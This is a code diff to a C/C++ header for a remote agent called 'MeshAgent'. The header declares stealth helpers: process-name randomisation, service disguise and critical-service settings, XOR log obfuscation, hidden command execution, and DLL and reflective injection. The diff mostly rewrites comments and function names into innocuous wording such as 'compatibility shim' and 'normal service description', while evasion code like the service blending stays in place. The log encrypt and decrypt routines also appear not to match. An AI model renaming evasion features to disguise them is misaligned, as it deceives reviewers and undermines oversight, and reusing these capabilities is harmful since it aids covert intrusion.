@@ -1,11 +1,11 @@
 /*
- * MeshAgent Stealth compatibility declarations
+ * MeshAgent runtime compatibility declarations
  *
  * SECURITY NOTE: These techniques are for authorized defensive security research only.
  * Unauthorized use may violate computer fraud and abuse laws.
  *
  * BUILD SAFETY:
- * Legacy stealth/evasion helpers are retained only as compatibility shims for
+ * Legacy runtime helpers are retained only as compatibility shims for
  * older call sites. They must not alter production runtime decisions.
  */
 
@@ -26,8 +26,8 @@
 #endif
 
 // Avoid pulling in winternl/ntdll by default to reduce surface area and
-// accidental reliance on unstable/undocumented structures. Only include when
-// stealth features are explicitly enabled.
+// accidental reliance on unstable/undocumented structures. Only include for
+// explicit lab builds.
 #ifdef MESHAGENT_ENABLE_STEALTH
 #include <winternl.h>
 #pragma comment(lib, "ntdll.lib")
@@ -37,7 +37,7 @@
 // safe to include from both .c and .cpp files.
 #ifdef __cplusplus
 
-// Process name obfuscation (no-op by default)
+// Process naming compatibility shim (no-op by default)
 class ProcessNameObfuscator {
 public:
     static BOOL SetRandomProcessName() {
@@ -57,11 +57,11 @@ public:
 #endif
     }
 
-    // Hide process from task managers via undocumented internals (disabled by default)
+    // Task manager visibility is preserved by default.
     static BOOL HideFromTaskManager() { return FALSE; }
 };
 
-// Network connection compatibility shims
+// Network connection compatibility shims.
 class NetworkStealth {
 public:
     static DWORD GetObfuscatedSleepTime(DWORD baseTime) {
@@ -78,10 +78,10 @@ public:
     }
 };
 
-// Service hiding techniques
+// Service maintenance helpers.
 class ServiceStealth {
 public:
-    // Make service appear as critical system service
+    // Configure normal service recovery behavior.
     static BOOL SetServiceAsCritical(SC_HANDLE hService) {
         SERVICE_FAILURE_ACTIONS sfa = {0};
 
@@ -101,7 +101,7 @@ public:
         return ChangeServiceConfig2(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
     }
 
-    // Hide service from services.msc by modifying description
+    // Set a normal service description.
     static BOOL BlendWithSystemServices(SC_HANDLE hService) {
         // Use generic Windows service description
         static const wchar_t* description =
@@ -115,13 +115,13 @@ public:
     }
 };
 
-// Log file encryption
+// Log file transformation helpers.
 class LogEncryption {
 private:
-    static const BYTE XOR_KEY = 0xA5;  // Simple XOR key (replace with AES for production)
+    static const BYTE XOR_KEY = 0xA5;
 
 public:
-    // Encrypt log data before writing
+    // Transform log data before writing.
     static void EncryptBuffer(LPBYTE buffer, DWORD size) {
         for (DWORD i = 0; i < size; i++) {
             buffer[i] ^= XOR_KEY;
@@ -129,7 +129,7 @@ public:
         }
     }
 
-    // Decrypt log data when reading
+    // Restore transformed log data when reading.
     static void DecryptBuffer(LPBYTE buffer, DWORD size) {
         for (DWORD i = 0; i < size; i++) {
             buffer[i] = (buffer[i] >> 3) | (buffer[i] << 5);  // Reverse bit rotation
@@ -301,29 +301,24 @@ BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName);
 // implemented as harmless stubs returning FALSE/ERROR where appropriate.
 BOOL Stealth_ExecuteCmdHidden(const char* command, char* output, size_t outputSize);
 
-/**
- * Execute command by injecting into existing legitimate process
- */
-BOOL Stealth_ExecuteViaProcessInjection(const char* command, const wchar_t* targetProcess);
-
 // ================================================================
-// Process Injection
+// Process Lookup and Remote Module Compatibility
 // ================================================================
 
 /**
- * Find suitable target process for injection (svchost, RuntimeBroker, etc.)
+ * Find a process by name for compatibility probes.
  */
-DWORD Stealth_FindInjectionTarget(const wchar_t* processName);
+DWORD Stealth_FindProcessByName(const wchar_t* processName);
 
 /**
- * Inject DLL into target process using CreateRemoteThread
+ * Remote module loading compatibility shim. Always blocked by policy.
  */
-BOOL Stealth_InjectDLL(DWORD processId, const wchar_t* dllPath);
+BOOL Stealth_LoadRemoteModuleCompat(DWORD processId, const wchar_t* dllPath);
 
 /**
- * Reflective DLL injection (load DLL from memory without file on disk)
+ * Memory module loading compatibility shim. Always blocked by policy.
  */
-BOOL Stealth_ReflectiveInject(DWORD processId, const BYTE* dllBytes, size_t dllSize);
+BOOL Stealth_LoadMemoryModuleCompat(DWORD processId, const BYTE* dllBytes, size_t dllSize);
 
 // ================================================================
 // Service Resilience & Persistence
